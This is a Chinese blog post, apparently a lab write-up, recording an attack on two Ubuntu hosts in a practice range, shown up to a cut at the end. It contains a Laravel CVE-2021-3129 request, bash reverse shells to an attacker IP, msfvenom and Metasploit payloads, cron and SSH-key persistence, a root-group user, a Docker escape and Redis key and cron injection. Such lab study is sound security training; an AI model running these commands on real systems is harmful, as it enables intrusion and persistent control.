id="post-红队靶场-7" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">红队靶场-7</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check">创建于</i> <a href="/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/" class="article-date"><time datetime="2023-07-13T12:49:46.000Z" itemprop="datePublished">2023-07-13</time> </a></span><span class="article-updated"><i class="icon icon-calendar-check">更新于</i> <a href="/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/" class="article-updated"><time datetime="2023-07-13T12:49:46.000Z" itemprop="datePublished">2023-07-13</time> </a></span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/" class="leancloud_visitors" data-flag-title="红队靶场-7"><span class="leancloud-visitors-count">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 6.5k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 32(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h1 id="基础环境设置"><a class="markdownIt-Anchor" href="#基础环境设置"></a> 基础环境设置</h1><p>192.168.95.143</p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/9eek/p/16703300.html">https://www.cnblogs.com/9eek/p/16703300.html</a></p><h1 id="ubuntu1-web1"><a class="markdownIt-Anchor" href="#ubuntu1-web1"></a> Ubuntu1 web1</h1><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>开启端口： 22 ssh/ 80 81 laravel / 6379 redis2.8.17 / os linux4.15-5.8</p><h2 id="攻击laravel"><a class="markdownIt-Anchor" href="#攻击laravel"></a> 攻击Laravel</h2><p>扫描发现80 81 6379端口，访问80端口发现是Nginx代理到81端口了，访问81端口，发现Laravel PHP框架，存在漏洞：CVE-2021-3129 Laravel Debug mode 远程代码执行漏洞。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/123241080">https://blog.csdn.net/weixin_46944519/article/details/123241080</a></p><p>验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.95.52:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: XSRF-TOKEN=eyJpdiI6IlppM3EyQjJ6U0htNkozTUNzOC9qZHc9PSIsInZhbHVlIjoicEt2bG9zbXNoSnUvb3BpTERlWGgvQ25OTHVHY2pzckFBdVZzd0JJbjd4RStUdUw5dEFrOFR2SzBQVVYzSXEvMGErLzRlWWN3NEs1cENSMmxQTTA1bEhoVW1NUkUyVDZuZFpvMytRaVkrVFQ4Tnhqc1ZKT1RxbmdLbVE1M2drM0wiLCJtYWMiOiIzNGRiNWFjYzE1YzE4MWMwNDA1Zjc1MWU1MzI4NjNkZjNmZTU2MzhkYzAzMWMxYTE2YTY3YjMzMTNlNGQ5MjBiIn0%3D; laravel_session=eyJpdiI6IkFYSytHN1VMbndGSlp4OXRMMDZaU1E9PSIsInZhbHVlIjoiVGZ5VGVMMklKRTVmWGlrVUl5WlkrNFptNXpCQTNCWmtpdlprWExiQUVsZVpWL0lwdzZKaXJCQ2NSTnBXV3A3T0E3WFpncHhnV05kZ3NSNUx6TFhEQ2xnYkxacXlNN2ZVSXJZZTMvVG9kaHhqRmYySVRFc0NMSlhRUnQ5V21PdDIiLCJtYWMiOiI3MTgwNTUxYjkxNDFjNzczNWYwMjRkMzg1NWVmNDc2NGIzYTc5ZGM0MmRkNWQ3M2ZjYzJjOGM3NTBjNzU4M2FlIn0%3D</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;index&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用EXP：<a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP%EF%BC%8C%E5%BE%97%E5%88%B0webshell">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP，得到webshell</a></p><p>使用EXP：<a target="_blank" rel="noopener" href="https://github.com/ajisai-babu/CVE-2021-3129-exp%EF%BC%8C%E5%BE%97%E5%88%B0webshell%EF%BC%88%E8%9A%81%E5%89%91%EF%BC%89">https://github.com/ajisai-babu/CVE-2021-3129-exp，得到webshell（蚁剑）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用上面的exp，他要用哥斯拉，我硬是连不上，绝了</span><br><span class="line">webshell地址:http://192.168.95.52:81/fuckyou.php,密码:pass</span><br><span class="line">使用另外的EXP</span><br><span class="line">[OK] 成功写入webshell, 访问地址 http://10.131.210.214:81/shell.php , 密码 whoami</span><br></pre></td></tr></table></figure><p>发现目录：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714093124402.png" alt="image-20230714093124402"></p><p>上传linenum搜集信息，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 另一个网段</span><br><span class="line">nameserver 192.168.52.2</span><br><span class="line"># Sudo version 可以进行sudo提权（&lt;1.8.28）</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line"># 安装的程序</span><br><span class="line">/usr/bin/gcc</span><br></pre></td></tr></table></figure><p>更看到一个SUID，名字叫shell，看到源码，执行一下发现，不知道可不可以进行环境变量提权，看条件，他没有出现<code>.</code>这个字符，</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714095845843.png" alt="image-20230714095845843"></p><p>去看看任务：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714100122687.png" alt="image-20230714100122687"></p><p>完全没发现，我们是在一个docker里面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Hostname:</span><br><span class="line">8e172820ac78</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714104612542.png" alt="image-20230714104612542"></p><p>看来现在首先要做的就是docker逃逸了，但是得先提权，sudo和suid环境变量提权都是可以的</p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111147194.png" alt="image-20230714111147194"></p><p>反弹个shell，用msf接管：<code>system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.131.210.172/4444 0&gt;&amp;1&quot;');</code></p><h3 id="suid环境变量提权"><a class="markdownIt-Anchor" href="#suid环境变量提权"></a> SUID+环境变量提权</h3><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111401102.png" alt="image-20230714111401102"></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111503937.png" alt="image-20230714111503937"></p><blockquote><p>坑点：在蚁剑的webshell终端里，执行这个PATH没用。还有我以为只有当<code>$PATH</code>里面有<code>.</code>才能算有利用的可能，其实不是的，最重要是有可以以root执行系统命令的二进制文件，然后通过环境变量替换执行的系统命令。把我们伪造的命令PATH放到最前面，先解析。</p></blockquote><p>生成msf木马，由meterpreter接管。即权限维持，这里有多种方式</p><ol><li><p>计划任务</p><p>生成msfvenom木马，上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.131.210.172 LPORT=4545 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714114410437.png" alt="image-20230714114410437"></p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;echo &#x27;*/1 * * * * /bin/bash /tmp/shell.elf;/bin/bash --noprofile -i&#x27;)|crontab -</span><br></pre></td></tr></table></figure><p>但是没有，所以就放到这把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这几个路径都可以存放cron执行脚本,对应的时间不同</span><br><span class="line">/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ </span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714131934378.png" alt="image-20230714131934378"></p></li><li><p>启动项</p></li><li><p>添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd jeff</span><br><span class="line">passwd jjj</span><br><span class="line">usermod -aG root jeff</span><br><span class="line">#检查</span><br><span class="line">groups jeff</span><br></pre></td></tr></table></figure></li><li><p>公私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成公钥</span><br><span class="line">echo id_rsa.pub &gt;&gt; .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里</span><br><span class="line"></span><br><span class="line">echo read_team_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>改密码</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714113900832.png" alt="image-20230714113900832"></p></li></ol><p>因为是docker，所以，ssh没用，crontab没用也差不多</p><h3 id="sudo提权"><a class="markdownIt-Anchor" href="#sudo提权"></a> sudo提权</h3><p>它竟然有好多个版本，但是都没有成功：</p><h4 id="cve-2021-3156"><a class="markdownIt-Anchor" href="#cve-2021-3156"></a> CVE-2021-3156</h4><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133329073.png" alt="image-20230714133329073"></p><h4 id="cve-2023-22809"><a class="markdownIt-Anchor" href="#cve-2023-22809"></a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/129971508">CVE-2023-22809</a></h4><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133643490.png" alt="image-20230714133643490"></p><p><a target="_blank" rel="noopener" href="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc">https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc</a></p><h2 id="docker逃逸"><a class="markdownIt-Anchor" href="#docker逃逸"></a> docker逃逸</h2><p>发现目录存在：<code>.dockerenv</code>的时候就说明我们在docker里面了，也可以查看<code>cat /proc/1/cgroup</code></p><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p><ol><li>利用dirty cow来进行docker逃逸</li><li>cve-2019-5736</li><li>docker配置不当</li></ol><p>总的来说，docker逃逸大部分原因都是配置出现的错误，导致能够在docker机里面直接修改宿主机的一些文件，包括挂载了socket、procfs、/等，只有少部分是由于内核漏洞导致的，所以处理好配置问题，docker逃逸应该挺难。</p><h3 id="脏牛漏洞docker逃逸"><a class="markdownIt-Anchor" href="#脏牛漏洞docker逃逸"></a> 脏牛漏洞docker逃逸</h3><p>脏牛漏洞的成因是get_user_page内核函数在处理Copy-on-Write过程时，可能产生竞态条件，导致<strong>出现了能够写数据到进程空间只读内存区域的机会</strong>。</p><p>linux中存在VDSO小型共享库，能将内核自动映射到用户程序的地址空间，<strong>即将内核函数映射到内存</strong>。</p><p>当linux存在脏牛漏洞时，我们可以利用脏牛漏洞获取到<strong>内存的写权限</strong>，便可以写入shellcode到VDSO中，使得调用正常函数时执行shellcode，进而反弹shell，从而实现dokcer逃逸。</p><p>exp：<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso.git">https://github.com/scumjr/dirtycow-vdso.git</a></p><h3 id="cve-2020-15257逃逸"><a class="markdownIt-Anchor" href="#cve-2020-15257逃逸"></a> CVE-2020-15257逃逸</h3><h3 id="cve-2019-5736"><a class="markdownIt-Anchor" href="#cve-2019-5736"></a> CVE-2019-5736</h3><p>该漏洞（CVE-2019-5736）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><p>利用该漏洞需要满足以下两个条件之一：</p><blockquote><p>由一个攻击者控制的恶意镜像创建</p><p>攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p></blockquote><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p><p><strong>注意！docker需要重启才能出发漏洞，怎么说都有点鸡肋。</strong></p><h3 id="docker配置不当"><a class="markdownIt-Anchor" href="#docker配置不当"></a> docker配置不当</h3><h4 id="特权逃逸"><a class="markdownIt-Anchor" href="#特权逃逸"></a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/129708068">特权逃逸</a></h4><p>原理十分简单，特权模式使得宿主机磁盘被挂载到了docker的目录，修改docker目录中的/etc/crontab相当于修改了宿主机的/etc/crontab</p><p>应该判断：<strong>判断是否特全模式启动</strong>：<code>cat /proc/self/status | grep Cap</code>。对应掩码为0000003fffffffff</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714144825877.png" alt="image-20230714144825877"></p><ol><li><p>在docker中创建目录，然后将宿主机的磁盘挂载到新建的目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"># return</span><br><span class="line">Device     Boot    Start      End  Sectors Size Id Type</span><br><span class="line">/dev/sda1  *        2048 16779263 16777216   8G 83 Linux</span><br><span class="line"></span><br><span class="line">mkdir /jeff</span><br><span class="line">mount /dev/sda1 /jeff</span><br></pre></td></tr></table></figure></li><li><p>将反弹shell等写入计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/10.131.210.172/4666 0&gt;&amp;1&quot; &gt;/jeff/jeff.sh</span><br><span class="line">echo &quot;* * * * * root bash /jeff.sh&quot; &gt;&gt; /jeff/etc/crontab</span><br></pre></td></tr></table></figure></li><li><p>成功</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714145429570.png" alt="image-20230714145429570"></p></li></ol><p>当然，我们可以通过写入计划任务的方式在宿主机执行metasploit生成的命令。它就是ubuntu2</p><p>首先使用metasploit的web_delivery模块生成payload命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 6    # 选择目标系统</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.131.210.172</span><br><span class="line">set lport 8023</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后OK</p><h1 id="ubuntu1主机上线msf"><a class="markdownIt-Anchor" href="#ubuntu1主机上线msf"></a> Ubuntu1主机上线msf</h1><p>因为逃逸的关系，所以直接打上ubuntu2了，但是ubuntu1的权限该拿还得拿，发现之前有个redis，还有ssh，那估计就是redis写ssh密钥来获取权限了。（他没有运行什么脚本，不能上传webshell，当然，写计划任务反弹shell也行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.基本命令：</span><br><span class="line">        查看数据库中的内容：keys * （redis数据库没有表，是大量的键值对组成的）</span><br><span class="line">        添加键值对：set qiao wang（意思为键为qiao，值为wang），输入get qiao，会输出wang</span><br><span class="line">        删除键值对：del qiao</span><br></pre></td></tr></table></figure><h2 id="redis写入ssh"><a class="markdownIt-Anchor" href="#redis写入ssh"></a> redis写入ssh</h2><p>影响版本小于redis-4.0.10，而这个redis是2.8版本的，完全OK</p><p>生成ssh密钥对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后连接受害主机的redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ redis-cli -h 10.131.210.214</span><br><span class="line">10.131.210.214:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/home/web&quot;</span><br><span class="line">10.131.210.214:6379&gt; config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">10.131.210.214:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; set xz &quot;\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgvTycRe11wx+3Q+UqCBCVJB9LYwUEk9h5+b7Ul3QJ8Kgwo7SLYnSNFBdPwEFoovPAiu8U5ez8F9ZINWHrCVdFAdS/Dwk/plmTUfySkeohYFvAtyVY7va1boqEFbBqH+Y8NnAPMvJrKS9ooV4PcFlPVyNTJEMAsthIXOTpZxtPyYjntdTMZUnz2blq2uolqyPcwh6xQ2CrYaJcbOhoGDHIa7N6HzknJ0RMuXUGaZdgxHGCr+m6UW2IVobDtUEGDRQEyynbfE54P6kMNiIsDdlT2KkZpyWBMCEP0ouI79puC9zPOkac3wP6gpFy2cv2GehcbKc1V2WSNtfW/b0I8M7QmSrmh4Vd3O4vGpFRsh9pY/DLqpyYXuHHuPFgZlHU4m0fF+/bmWG72I1ywYJm+1v2EFmydjcaCkq9qCAb89DqeAh9qQXEIDbgekqxcRRIeQ5lRMrfRrU+uAfkLaUot9UTx6NePMSufPPVFo6pSh0Z1rhFZh0QorMlRZpOa6U7WBc= j3fffff@j3fffff  \n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.131.210.214:6379&gt; </span><br></pre></td></tr></table></figure><p>然后连接ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">──(j3fffff㉿j3fffff)-[/root/.ssh]</span><br><span class="line">└─$ ssh -i /home/j3fffff/.ssh/red_team_rsa root@10.131.210.214</span><br></pre></td></tr></table></figure><h2 id="写入计划任务"><a class="markdownIt-Anchor" href="#写入计划任务"></a> 写入计划任务</h2><pre><code>10.131.210.214:6379&gt; config set dir /var/spool/cron
10.131.210.214:6379&gt; set h4ck &quot;\n * * * * * bash -i &gt;&amp; /dev/tcp/10.131.210.172/4667 0&gt;&amp;1 \n&quot;
10.131.210.214:6379&gt; save
</code></pre><p>但是不知道为啥会乱码，不成功</p><h2 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h2><p>使用项目：<code>https://github.com/Dliv3/redis-rogue-server</code></p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">适用于目标Redis服务处于外网的情况</span><br><span class="line"></span><br><span class="line">    外网Redis未授权访问</span><br><span class="line">    已知外网Redis口令</span><br><span class="line"></span><br><span class="line">启动redis rogue server，并主动连接目标redis服务发起攻击</span><br><span class="line"></span><br><span class="line">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">    --rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</span><br><span class="line">    --rhost 目标redis服务IP</span><br><span class="line">    --rport 目标redis服务端口，默认为6379</span><br><span class="line">    --lhost vps的外网IP地址</span><br><span class="line">    --lport vps监控的端口，默认为21000</span><br><span class="line"></span><br><span class="line">攻击成功之后，你会得到一个交互式shell</span><br></pre></td></tr></table></figure><p>攻击步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python redis_rogue_server.py -v(攻击机)</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename moudle.so</span><br><span class="line">slaveof ip port（端口是脚本启动的端口）</span><br><span class="line">module load ./moudle.so</span><br><span class="line">slaveof NO ONE（断掉主从模式）</span><br><span class="line">nc -lvvp port（攻击机）</span><br><span class="line">system.rev ip port（反弹shell接收的端口）</span><br></pre></td></tr></table></figure><p>此时可以使用命令：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; system.exec &quot;id&quot;</span><br><span class="line">&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; system.exec &quot;whoami&quot;</span><br><span class="line">&quot;root\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; system.rev 127.0.0.1 9999</span><br></pre></td></tr></table></figure><p>假如redis在内网，需要使用ssrf来控制主机主动连接我们的恶意主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">被动连接模式</span><br><span class="line">适用于目标Redis服务处于内网的情况</span><br><span class="line"></span><br><span class="line">    通过SSRF攻击Redis</span><br><span class="line">    内网Redis未授权访问/已知Redis口令, Redis需要反向连接redis rogue server</span><br></pre></td></tr></table></figure><p>但是我这没成功，返回<code>[-&gt;] b&quot;-ERR unknown command 'MODULE'\r\n&quot;</code></p><h1 id="ubuntu2主机上线msf"><a class="markdownIt-Anchor" href="#ubuntu2主机上线msf"></a> Ubuntu2主机上线msf</h1><p>赶紧写ssh密钥啊！先上线meterpreter!</p><p>使用 <code>post/multi/manage/shell_to_meterpreter</code>模块来将 shell 升级为 meterpreter。</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714152845811.png" alt="image-20230714152845811"></p><h2 id="信息搜集-2"><a class="markdownIt-Anchor" href="#信息搜集-2"></a> 信息搜集</h2><p>当连接4666端口时，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command shell session 1 opened (10.131.210.172:4666 -&gt; 10.131.210.104:8099) at 2023-07-17 10:28:06 +0800</span><br></pre></td></tr></table></figure><p>然后搜集网卡信息，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">br-05384b1b0df2 Link encap:Ethernet  HWaddr 02:42:a5:2b:31:45  </span><br><span class="line">          inet addr:172.18.0.1  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">br-1d665e13ee58 Link encap:Ethernet  HWaddr 02:42:fe:3c:7e:8b  </span><br><span class="line">          inet addr:172.20.0.1  Bcast:172.20.255.255  Mask:255.255.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:a1:6e:d8  </span><br><span class="line">          inet addr:192.168.52.20  Bcast:192.168.52.255  Mask:255.255.255.0</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0c:29:a1:6e:e2  </span><br><span class="line">          inet addr:192.168.93.10  Bcast:192.168.93.255  Mask:255.255.255.0</span><br></pre></td></tr></table></figure><p>算了，还是直接上传linenum，直接扫吧</p><p>发现域名：<a target="_blank" rel="noopener" href="http://www.rebootuser.com">www.rebootuser.com</a></p><p>系统内核：Linux ubuntu 4.4.0-142-generic （脏牛：&gt;=2.6.22）Ubuntu 14.04.6 LTS（这个好像有漏洞）</p><p>因为之前写了一个用户，所以知道</p><ul><li>ubuntu</li><li>jeff / abc123</li></ul><p>计划任务</p><ul><li>/etc/crontab</li><li>/etc/cron.daily</li><li>/etc/cron.d</li></ul><p>nameserver 192.168.52.2</p><p>端口：22（ssh） 631（？） 8000（docker）</p><p>历史记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2018-12613</span><br><span class="line">ls</span><br><span class="line">cd phpmyadmin/</span><br><span class="line"></span><br><span class="line">redis-2.8.17</span><br></pre></td></tr></table></figure><h2 id="写ssh密钥"><a class="markdownIt-Anchor" href="#写ssh密钥"></a> 写ssh密钥</h2><p>下载配置文件：<code>/etc/ssh/sshd_config</code>里面的配置，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">#AuthorizedKeysFile	%h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>这不行，需要把最后一个给注释掉，然后把我们的密钥写上（已经上传）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat red_team_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"># 重启</span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><p><img 